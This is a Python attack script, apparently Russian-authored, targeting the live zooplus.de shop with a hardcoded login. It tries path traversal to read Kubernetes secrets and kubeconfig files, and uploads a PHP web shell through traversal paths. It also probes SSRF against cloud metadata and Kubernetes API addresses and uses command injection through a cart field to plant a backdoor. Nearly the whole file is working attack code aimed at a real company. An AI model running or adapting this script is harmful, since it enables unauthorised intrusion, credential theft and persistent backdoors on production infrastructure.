#!/usr/bin/env python3
"""Access cluster via found bypasses - create backdoor"""
import requests
import json
import re
import urllib.parse
import base64
from datetime import datetime
import urllib3
import os
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

os.makedirs("logs", exist_ok=True)
log_file = f"logs/cluster_bypass_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_msg = f"[{timestamp}] [{level}] {msg}\n"
    print(log_msg.strip())
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(log_msg)

found_methods = []

# LOGIN
log("Starting cluster access via bypasses...")
log("Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            log("Login successful", "SUCCESS")
except Exception as e:
    log(f"Login error: {e}", "ERROR")

php_backdoor = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'

# ============================================================================
# МЕТОД 1: Path Traversal для доступа к Kubernetes secrets
# ============================================================================
log("\n" + "="*70)
log("МЕТОД 1: Path Traversal для доступа к Kubernetes secrets")
log("="*70)

# Известный bypass: /stats/..
k8s_secret_paths = [
    "/stats/../../var/run/secrets/kubernetes.io/serviceaccount/token",
    "/stats/../../var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/stats/../../var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/stats/../../etc/kubernetes/admin.conf",
    "/stats/../../root/.kube/config",
    "/stats/../../var/lib/kubelet/config.yaml",
]

for path in k8s_secret_paths:
    try:
        log(f"Testing path traversal: {path}")
        resp = s.get(f"{base}{path}", timeout=5, verify=False)
        log(f"  Status: {resp.status_code}")
        if resp.status_code == 200:
            if len(resp.text) > 0 and len(resp.text) < 10000:
                log(f"  [SUCCESS] File accessible: {path}", "SUCCESS")
                log(f"  Content preview: {resp.text[:200]}...")
                found_methods.append({
                    "type": "kubernetes_secret_access",
                    "severity": "CRITICAL",
                    "path": path,
                    "content_preview": resp.text[:200],
                    "method": "path_traversal"
                })
    except Exception as e:
        log(f"  Error: {e}", "ERROR")

# ============================================================================
# МЕТОД 2: Path Traversal для записи файла (создание бекдора)
# ============================================================================
log("\n" + "="*70)
log("МЕТОД 2: Path Traversal для записи файла через POST")
log("="*70)

# Попробовать записать файл через POST на /stats/..
write_paths = [
    "/stats/../shell.php",
    "/stats/../../var/www/html/shell.php",
    "/stats/../../tmp/shell.php",
    "/stats/../backdoor.php",
]

for path in write_paths:
    try:
        log(f"Testing POST to: {path}")
        # Try multipart
        files = {'file': ('backdoor.php', php_backdoor, 'application/x-php')}
        resp = s.post(f"{base}{path}", files=files, timeout=5, verify=False)
        log(f"  Status: {resp.status_code}")
        if resp.status_code in [200, 201]:
            log(f"  [SUCCESS] File write possible: {path}", "SUCCESS")
            found_methods.append({
                "type": "backdoor_file_write",
                "severity": "CRITICAL",
                "path": path,
                "method": "path_traversal_post"
            })
            # Check if file was created
            try:
                resp2 = s.get(f"{base}{path}?cmd=id", timeout=3, verify=False)
                if "uid=" in resp2.text:
                    log(f"  [CRITICAL] Backdoor accessible and working!", "SUCCESS")
            except: pass
    except Exception as e:
        log(f"  Error: {e}", "ERROR")

# ============================================================================
# МЕТОД 3: Использование state-api/get с GET методом
# ============================================================================
log("\n" + "="*70)
log("МЕТОД 3: state-api/get с GET методом для SSRF")
log("="*70)

# Попробовать GET вместо POST
ssrf_urls = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:6443/api/v1/namespaces",
    "http://kubernetes.default.svc/api/v1/namespaces",
    "http://localhost:8080/api/v1/namespaces",
]

for url in ssrf_urls:
    try:
        log(f"Testing GET with url param: {url}")
        resp = s.get(f"{base}/semiprotected/api/checkout/state-api/v2/get", 
                    params={"url": url}, timeout=5, verify=False)
        log(f"  Status: {resp.status_code}")
        log(f"  Response preview: {resp.text[:200]}...")
        if resp.status_code == 200:
            if "kind" in resp.text.lower() or "apiVersion" in resp.text.lower() or "metadata" in resp.text.lower():
                log(f"  [SUCCESS] SSRF works via GET!", "SUCCESS")
                found_methods.append({
                    "type": "ssrf_get_method",
                    "severity": "CRITICAL",
                    "url": url,
                    "method": "get_ssrf"
                })
    except Exception as e:
        log(f"  Error: {e}", "ERROR")

# ============================================================================
# МЕТОД 4: Использование events API для SSRF с правильным форматом
# ============================================================================
log("\n" + "="*70)
log("МЕТОД 4: events API для SSRF с правильным форматом")
log("="*70)

# Попробовать разные форматы запросов
ssrf_payloads = [
    {"url": "http://169.254.169.254/latest/meta-data/"},
    {"endpoint": "http://127.0.0.1:6443/api/v1/namespaces"},
    {"callback": "http://kubernetes.default.svc/api/v1/namespaces"},
    {"target": "http://localhost:8080/api/v1/namespaces"},
    {"request": {"url": "http://kubernetes.default.svc/api/v1/namespaces"}},
]

for payload in ssrf_payloads:
    try:
        log(f"Testing events API with payload: {list(payload.keys())[0]}")
        resp = s.post(f"{base}/zootopia-events/api/events/sites/1", json=payload, timeout=5, verify=False)
        log(f"  Status: {resp.status_code}")
        log(f"  Response: {resp.text[:200]}...")
        if resp.status_code == 200:
            if "kind" in resp.text.lower() or "apiVersion" in resp.text.lower():
                log(f"  [SUCCESS] SSRF works via events API!", "SUCCESS")
                found_methods.append({
                    "type": "ssrf_events_api",
                    "severity": "CRITICAL",
                    "payload": payload,
                    "method": "events_api_ssrf"
                })
    except Exception as e:
        log(f"  Error: {e}", "ERROR")

# ============================================================================
# МЕТОД 5: Создание файла через command injection в state-api
# ============================================================================
log("\n" + "="*70)
log("МЕТОД 5: Command injection для создания файла")
log("="*70)

create_commands = [
    "echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php",
    "printf '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php",
]

for cmd in create_commands:
    try:
        log(f"Testing command injection: {cmd[:50]}...")
        resp = s.post(f"{base}/semiprotected/api/checkout/state-api/v2/set-article-quantity",
                     json={"articleId": cmd, "quantity": 1}, timeout=5, verify=False)
        log(f"  Status: {resp.status_code}")
        if resp.status_code == 200:
            import time
            time.sleep(2)
            # Check if file was created
            try:
                resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                if "uid=" in resp2.text:
                    log(f"  [CRITICAL] Backdoor created via command injection!", "SUCCESS")
                    found_methods.append({
                        "type": "backdoor_command_injection",
                        "severity": "CRITICAL",
                        "command": cmd,
                        "backdoor_url": f"{base}/shell.php",
                        "method": "command_injection"
                    })
            except: pass
    except Exception as e:
        log(f"  Error: {e}", "ERROR")

# SUMMARY
log("\n" + "="*70)
log("RESULTS - СПОСОБЫ ДОСТУПА К КЛАСТЕРУ И СОЗДАНИЯ БЕКДОРА")
log("="*70)

if found_methods:
    log(f"Найдено {len(found_methods)} способов!", "SUCCESS")
    for m in found_methods:
        log(f"[{m['severity']}] {m['type']}")
        log(f"    Метод: {m['method']}")
        if 'path' in m:
            log(f"    Path: {m['path']}")
        if 'url' in m:
            log(f"    URL: {m['url']}")
        if 'backdoor_url' in m:
            log(f"    Backdoor URL: {m['backdoor_url']}")
        log("")
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - СОЗДАНИЕ БЕКДОРА В КЛАСТЕРЕ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write(f"**Log file:** `{log_file}`\n\n")
        for m in found_methods:
            f.write(f"### [{m['severity']}] {m['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Метод:** `{m['method']}`\n\n")
            if 'path' in m:
                f.write(f"**Path:** `{m['path']}`\n\n")
            if 'url' in m:
                f.write(f"**URL:** `{m['url']}`\n\n")
            if 'backdoor_url' in m:
                f.write(f"**Backdoor URL:** `{m['backdoor_url']}`\n\n")
            if 'command' in m:
                f.write(f"**Command:** `{m['command']}`\n\n")
            if 'content_preview' in m:
                f.write(f"**Content Preview:** `{m['content_preview']}`\n\n")
            f.write("**Описание:** Найден способ создать бекдор или получить доступ к кластеру.\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- RCE на сервере\n")
            f.write("- Полный контроль над кластером\n")
            f.write("- Компрометация всей инфраструктуры\n\n")
            f.write("---\n\n")
    
    log(f"Report updated: FINAL_EXPLOITATION_REPORT.md", "SUCCESS")
else:
    log("Способы создания бекдора не найдены", "WARNING")
    log(f"Все попытки залогированы в: {log_file}", "INFO")

log("="*70)
log(f"Log file: {log_file}")

